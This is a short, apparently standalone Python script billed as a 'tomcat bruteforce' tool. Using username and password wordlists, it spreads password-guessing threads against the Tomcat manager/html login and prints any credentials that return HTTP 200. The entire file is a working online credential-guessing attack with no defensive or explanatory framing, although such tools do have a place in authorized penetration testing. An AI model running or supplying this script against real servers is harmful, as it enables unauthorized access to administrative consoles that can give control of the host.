import requests
import argparse
import threading
import time

parser = argparse.ArgumentParser("tomcat bruteforce")
parser.add_argument("--host", "-u", help="host of the tomcat application")
parser.add_argument("--password", "-p", help="word list containing passwords")
parser.add_argument("--username", "-l", help="word list containing usernames")
parser.add_argument("--threads", "-t", help="number of threads", default='10')
parser.add_argument("--uri", help="uri of the target", default='manager/html')

def bruteforce(host, users, password_list, uri):
    get_headers = {
        "Host" : host,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": f"http://{host}/",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }

    for username in users:
        for password in password_list:
            print(f"\033[KTrying: {username}:{password}", end="\r")
            if requests.head(url=f"http://{host}/{uri}", headers=get_headers, auth=(username, password)).status_code == 200:
                print(f"Found valid credentials: {username}:{password}")
                
args = parser.parse_args()

host, user_list, pass_list, threads, uri = args.host, args.username, args.password, int(args.threads), args.uri

try:
    users = open(user_list, errors='ignore').read().split()
except FileNotFoundError:
    users = [user_list]

try:
    passwds = open(pass_list, errors='ignore').read().split()
except FileNotFoundError:
    passwds = [pass_list]
    
list_size = (len(passwds)-1)//threads + 1

start = time.time_ns()
threads = []
for i in range(0, len(passwds), list_size):
    thread = threading.Thread(target=bruteforce, args=(host, users, passwds[i:i+list_size+1], uri))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
print(f"Finished in {(time.time_ns() - start)//1000000}ms")
